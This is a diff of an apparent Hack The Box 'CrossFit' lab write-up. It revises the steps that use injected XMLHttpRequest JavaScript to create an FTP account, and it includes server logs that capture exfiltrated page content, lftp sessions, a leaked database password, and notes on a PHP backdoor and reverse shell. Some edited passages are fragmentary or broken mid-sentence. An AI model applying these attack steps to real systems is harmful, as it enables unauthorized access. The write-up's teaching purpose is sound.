@@ -488,6 +488,7 @@ I received the reply back, this time with only the hidden token.
 var test = "http://ftp.crossfit.htb/accounts/create";
 var request1 = new XMLHttpRequest();
 request1.open('GET', test, false);
+request1.withCredentials = true;
 request1.send()
 var response1 = request1.responseText;
 
@@ -523,11 +524,11 @@ request4.send();
 wrote payload to create new ftp user
 
 ```text
-10.10.10.208 - - [21/Mar/2021 21:12:25] "GET /test3.js HTTP/1.1" 200 -
-10.10.10.208 - - [21/Mar/2021 21:12:26] code 501, message Unsupported method ('POST')
-10.10.10.208 - - [21/Mar/2021 21:12:26] "POST /username=test&pass=test&_token=On4dM6BoQTHUTV4aRTi16SlPIxnTcea41HksabOd HTTP/1.1" 501 -
-10.10.10.208 - - [21/Mar/2021 21:43:40] code 404, message File not found
-10.10.10.208 - - [21/Mar/2021 21:43:40] "GET /%3C!DOCTYPE%20html%3E%3Chtml%20lang=%22en%22%3E%20%20%20%20%3Chead%3E%20%20%20%20%20%20%20%20%3Cmeta%20charset=%22utf-8%22%3E%20%20%20%20%20%20%20%20%3Cmeta%20name=%22viewport%22%20content=%22width=device-width,%20initial-scale=1%22%3E%20%20%20%20%20%20%20%20%3Ctitle%3EPage%20Expired%3C/title%3E%20%20%20%20%20%20%20%20%3C!--%20Fonts%20--%3E%20%20%20%20%20%20%20%20%3Clink%20rel=%22dns-prefetch%22%20href=%22//fonts.gstatic.com%22%3E%20%20%20%20%20%20%20%20%3Clink%20href=%22https://fonts.googleapis.com/css?family=Nunito%22%20rel=%22stylesheet%22%3E%20%20%20%20%20%20%20%20%3C!--%20Styles%20--%3E%20%20%20%20%20%20%20%20%3Cstyle%3E%20%20%20%20%20%20%20%20%20%20%20%20html,%20body%20{%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20background-color:%20 HTTP/1.1" 404 -
+10.10.10.208 - - [21/Mar/2021 21:51:58] "GET /test3.js HTTP/1.1" 200 -
+10.10.10.208 - - [21/Mar/2021 21:51:58] code 501, message Unsupported method ('POST')
+10.10.10.208 - - [21/Mar/2021 21:51:58] "POST /username=test3&pass=p@ssword123&_token=EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at HTTP/1.1" 501 -
+10.10.10.208 - - [21/Mar/2021 21:51:58] code 404, message File not found
+10.10.10.208 - - [21/Mar/2021 21:51:58] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22alert%20alert-success%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EAccount%20created%20successfully.%3C/p%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E1%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3Etest3%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E2021-01-15%2002:01:55%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action=%22http://ftp.crossfit.htb/accounts/85%22%20method=%22POST%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-info%22%20href=%22http://ftp.crossfit.htb/accounts/85%22%3EShow%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts/85/edit%22%3EEdit%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_method%22%20value=%22DELETE%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-danger%22%3EDelete%3C/button%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/td%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
 Got a response on my server
@@ -536,14 +537,57 @@ Got a response on my server
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8" />
-    <meta name="robots" content="noindex,nofollow,noarchive" />
-    <title>An Error Occurred: Method Not Allowed</title>
-    <style>body { background-color: 
-
+    <title>FTP Hosting - Account Management</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
+</head>
+<body>
+<br>
+<div class="container">
+        <div class="row">
+        <div class="col-lg-12 margin-tb">
+            <div class="pull-left">
+                <h2>FTP Hosting - Account Management</h2>
+            </div>
+            <div class="pull-right">
+                <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>
+            </div>
+        </div>
+    </div>
+            <div class="alert alert-success">
+            <p>Account created successfully.</p>
+        </div>
+        <table class="table table-bordered">
+        <tr>
+            <th>No</th>
+            <th>Username</th>
+            <th>Creation Date</th>
+            <th width="280px">Action</th>
+        </tr>
+                <tr>
+            <td>1</td>
+            <td>test3</td>
+            <td>2021-01-15 02:01:55</td>
+            <td>
+                <form action="http://ftp.crossfit.htb/accounts/85" method="POST">
+                    <a class="btn btn-info" href="http://ftp.crossfit.htb/accounts/85">Show</a>
+                    <a class="btn btn-primary" href="http://ftp.crossfit.htb/accounts/85/edit">Edit</a>
+                    <input type="hidden" name="_token" value="EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at">
+                    <input type="hidden" name="_method" value="DELETE">
+                    <button type="submit" class="btn btn-danger">Delete</button>
+                </form>
+            </td>
+        </tr>
+            </table>
+    </div>
+</body>
+</html>
 ```
 
-I'm not sure what happened, but this time I only got back a partial response.  It was enough to see that I was getting a "Method Not Allowed" error, which was strange.  The site said POST in the code, and I sent a POST.  I decided to see if I could log in despite the error.
+I decoded the HTML response, then prettified it.
+
+![](../../.gitbook/assets/2.9-ftp-user-created.png)
+
+After recreating the webpage from the response, I could see that my FTP account was created!  Next I tried to log into the server using FTP.
 
 ### Port 21 - FTP \(with LFTP\)
 
@@ -552,7 +596,7 @@ I'm not sure what happened, but this time I only got back a partial response.  I
 └─$ ftp crossfit.htb
 Connected to crossfit.htb.
 220 Cross Fit Ltd. FTP Server
-Name (crossfit.htb:zweilos): test
+Name (crossfit.htb:zweilos): test3
 530 Non-anonymous sessions must use encryption.
 Login failed.
 421 Service not available, remote server has closed connection
@@ -576,23 +620,107 @@ I tried logging in with FTP, but got an error `530 Non-anonymous sessions must u
 > lftp :~> set ssl:verify-certificate no
 > ```
 
+```text
+┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+└─$ lftp                                                                                            1 ⨯
+lftp :~> set ftp:ssl-force true
+lftp :~> connect ftp.crossfit.htb
+lftp ftp.crossfit.htb:~> login test3
+Password: 
+lftp test3@ftp.crossfit.htb:~> ls
+ls: Fatal error: Certificate verification: Not trusted (25:EC:D2:FE:6C:9D:77:04:EC:7D:D7:92:87:67:4B:C3:8D:0E:CB:CE)
+lftp test3@ftp.crossfit.htb:~> set ssl:verify-certificate no
+lftp test3@ftp.crossfit.htb:~> login test3
+Password: 
+lftp test3@ftp.crossfit.htb:~> ls
+drwxrwxr-x    2 33       1002         4096 Mar 21 21:45 development-test
+drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
+drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
+drwxr-xr-x    2 0        0            4096 May 01  2020 html
+```
 
-
-can PUT files, upload php backdoor
-
-enumerate a bit, create reverse shell as http-user
-
-found `adduser-hank.yml` in `/ansible` directory with hash -&gt; `hank:powerpuffgirls`
-
-
+Success! I was able to log into FTP with the user I had created.  I immediately found four folders.  
 
 ```text
-www-data@crossfit:/var/www/ftp/database/factories$ ls -la
-total 12
-drwxr-xr-x 2 root root 4096 May  1  2020 .
-drwxr-xr-x 5 root root 4096 May  1  2020 ..
--rw-r--r-- 1 root root  876 May  1  2020 UserFactory.php
-www-data@crossfit:/var/www/ftp/database/factories$ vi UserFactory.php
+lftp test3@ftp.crossfit.htb:/> ls development-test/
+lftp test3@ftp.crossfit.htb:/> ls ftp
+-rw-r--r--    1 0        0           35856 May 01  2020 CHANGELOG.md
+-rw-r--r--    1 0        0              61 May 01  2020 CREDITS
+-rw-r--r--    1 0        0            4497 May 01  2020 README.md
+drwxr-xr-x    6 0        0            4096 May 02  2020 app
+-rwxr-xr-x    1 0        0            1686 May 01  2020 artisan
+drwxr-xr-x    3 0        0            4096 May 01  2020 bootstrap
+-rw-r--r--    1 0        0            1586 May 01  2020 composer.json
+-rw-r--r--    1 0        0          207564 May 01  2020 composer.lock
+drwxr-xr-x    2 0        0            4096 May 02  2020 config
+drwxr-xr-x    5 0        0            4096 May 01  2020 database
+-rw-r--r--    1 0        0            1034 May 01  2020 package.json
+-rw-r--r--    1 0        0            1197 May 01  2020 phpunit.xml
+drwxr-xr-x    2 0        0            4096 May 01  2020 public
+drwxr-xr-x    6 0        0            4096 May 01  2020 resources
+drwxr-xr-x    2 0        0            4096 May 01  2020 routes
+-rw-r--r--    1 0        0             563 May 01  2020 server.php
+drwxr-xr-x    5 33       0            4096 May 01  2020 storage
+drwxr-xr-x    4 0        0            4096 May 01  2020 tests
+drwxr-xr-x   44 0        0            4096 May 01  2020 vendor
+-rw-r--r--    1 0        0             538 May 01  2020 webpack.mix.js
+lftp test3@ftp.crossfit.htb:/> ls gym-club/                          
+-rwxr-xr-x    1 0        0           21768 May 04  2020 about-us.php
+-rwxr-xr-x    1 0        0           23490 May 04  2020 blog-single.php
+-rwxr-xr-x    1 0        0           15024 May 04  2020 blog.php
+-rwxr-xr-x    1 0        0           13871 May 11  2020 contact.php
+drwxr-xr-x    2 0        0            4096 May 04  2020 css
+-rw-r--r--    1 0        0             151 May 04  2020 db.php
+drwxr-xr-x    5 0        0            4096 May 04  2020 fonts
+-rw-r--r--    1 0        0            3670 May 04  2020 functions.php
+-rwxr-xr-x    1 0        0           16800 May 04  2020 gallery.php
+drwxr-xr-x    3 0        0            4096 May 04  2020 images
+drwxr-xr-x    9 0        0            4096 Apr 30  2020 img
+-rwxr-xr-x    1 0        0           36336 May 04  2020 index.php
+-rwxr-xr-x    1 0        0            9000 May 12  2020 jointheclub.php
+drwxr-xr-x    2 0        0            4096 May 04  2020 js
+-rw-r--r--    1 0        0             931 May 04  2020 main.html
+-rw-r--r--    1 0        0             410 May 04  2020 readme.txt
+-rwxr-xr-x    1 0        0           23878 May 04  2020 schedule.php
+drwxr-xr-x    2 0        0            4096 Sep 02  2020 security_threat
+drwxr-xr-x    8 0        0            4096 May 04  2020 vendor
+lftp test3@ftp.crossfit.htb:/> ls html
+-rw-r--r--    1 0        0           10701 Apr 30  2020 index.html
+```
+
+Unfortunately the most interesting sounding folder `development-test/` was empty.
+
+```text
+lftp test3@ftp.crossfit.htb:/> get gym-club/db.php > gym-db.php
+151 bytes transferred                             
+lftp test3@ftp.crossfit.htb:/> cd database
+cd: Login failed: 530 Login incorrect.
+lftp test3@ftp.crossfit.htb:/> login test3
+Password: 
+```
+
+Annoyingly, the server seemed to delete my user account after a few minutes.  I had to recreate it and log in again each time.
+
+```php
+<?php
+$dbhost = "localhost";
+$dbuser = "crossfit";
+$dbpass = "oeLoo~y2baeni";
+$db = "crossfit";
+$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
+?>
+```
+
+In the `/gym-club` directory there was a file `db.php`. The password I found here unfortunately did not work with the username `crossfit` for either SSH or FTP.
+
+```text
+lftp test3@ftp.crossfit.htb:/> ls ftp/database
+drwxr-xr-x    2 0        0            4096 May 01  2020 factories
+drwxr-xr-x    2 0        0            4096 May 02  2020 migrations
+drwxr-xr-x    2 0        0            4096 May 01  2020 seeds
+lftp test3@ftp.crossfit.htb:/> ls ftp/database/factories/
+-rw-r--r--    1 0        0             876 May 01  2020 UserFactory.php
+lftp test3@ftp.crossfit.htb:/> get ftp/database/factories/UserFactory.php 876 bytes transferred in 1 second (876 B/s)
 ```
 
 database
@@ -628,9 +756,19 @@ $factory->define(User::class, function (Faker $faker) {
 });
 ```
 
-/var/www/ftp/database/factories password hash cracked to reveal ... 'password'
+/ftp/database/factories password hash cracked to reveal ... 'password'
 
 Note: something is missing here...getting initial connection back, finding and cracking the hash...
+
+
+
+can PUT files, upload php backdoor
+
+enumerate a bit, create reverse shell as http-user
+
+found `adduser-hank.yml` in `/ansible` directory with hash -&gt; `hank:powerpuffgirls`
+
+
 
 ## Initial Foothold
 
@@ -798,16 +936,10 @@ drwxr-xr-x  2 root     root   4096 May  1  2020 html
 While checking for other folders in the `/var/www` directory I noticed a few other than the standard `html`
 
 ```php
-<?php
-$dbhost = "localhost";
-$dbuser = "crossfit";
-$dbpass = "oeLoo~y2baeni";
-$db = "crossfit";
-$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
-?>
+
 ```
 
-In the `/var/www/gym-club/` directory there was a file `db.php`. The password I found here unfortunately did not work to switch users to `isaac` or `root`.
+ to switch users to `isaac` or `root`.
 
 ```sql
 hank@crossfit:/var/www/gym-club$ mysql -u crossfit -p -D crossfit
